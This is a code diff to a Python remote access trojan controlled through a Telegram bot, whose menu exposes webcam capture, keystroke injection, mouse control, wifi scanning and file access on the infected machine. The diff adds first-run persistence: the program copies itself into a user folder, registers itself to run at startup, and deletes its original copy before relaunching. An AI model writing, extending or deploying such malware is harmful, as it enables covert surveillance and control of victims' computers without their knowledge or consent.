@@ -24,7 +24,8 @@ from Modules import (
     send_key_press,
     wifi_scanner,
     open_website,
-    file_mgmt
+    file_mgmt,
+    startup
 )
 
 
@@ -66,7 +67,7 @@ async def main_menu(update: Update, context):
         [InlineKeyboardButton("🌐 Open Website", callback_data="open_website")],
         [
             InlineKeyboardButton(
-                "🖲️ Move mouse randomly and Slowly", callback_data="move_mouse"
+                "🖲️ Move mouse randomly", callback_data="move_mouse"
             )
         ],
         [InlineKeyboardButton("⌨️ Type String", callback_data="type_stringKey")],
@@ -200,7 +201,10 @@ async def get_file(update, context):
 
 async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    await query.answer()
+    try:
+        await query.answer()
+    except telegram.error.BadRequest:
+        await update.message.reply_text(f"Do /start")
     result = query.data
     
     if result == "get_Webcam":
@@ -355,7 +359,7 @@ def send_message(token, chat_id, message):
         pass
     else:
         pass
-def main():
+def start_bot():
     send_message(api_key, chat_id, "☠️ " + username + " Connected to " + cfg.rat_name + "\n\n🙊/start")
 
     application.add_handler(CommandHandler("start", main_menu))
@@ -378,5 +382,22 @@ def main():
     application.run_polling(allowed_updates=Update.ALL_TYPES)
     
 
+def is_first_run():
+    flag_file = os.path.join(os.getenv('APPDATA'), f"troll")
+    if os.path.exists(flag_file):
+        return False
+    else:
+        with open(flag_file, 'w') as f:
+            f.write('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
+        return True
+
+def main():
+    if is_first_run():
+        target_path = startup.copy_to_user_folder()
+        if target_path:
+            startup.add_to_startup(target_path)
+            startup.self_delete_and_run(target_path)
+    else:
+        start_bot()
 
 main()
